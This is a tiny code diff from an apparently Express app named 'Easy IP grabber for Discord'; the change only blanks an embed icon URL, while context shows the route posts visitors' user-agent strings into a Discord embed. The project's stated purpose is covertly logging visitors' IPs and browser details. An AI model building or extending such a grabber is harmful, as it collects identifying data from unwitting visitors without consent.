@@ -15,7 +15,7 @@ app.get('/', (req, res) => {
 		color: 16711740,
 		author : {
 			name: 'Easy IP grabber for Discord',
-			icon_url: 'https://cdn.discordapp.com/emojis/943980614720303105.webp?size=96&quality=lossless',
+			icon_url: '',
 		},
 		description: `\`\`\`${req.headers['user-agent']}\`\`\``,
 		fields: [
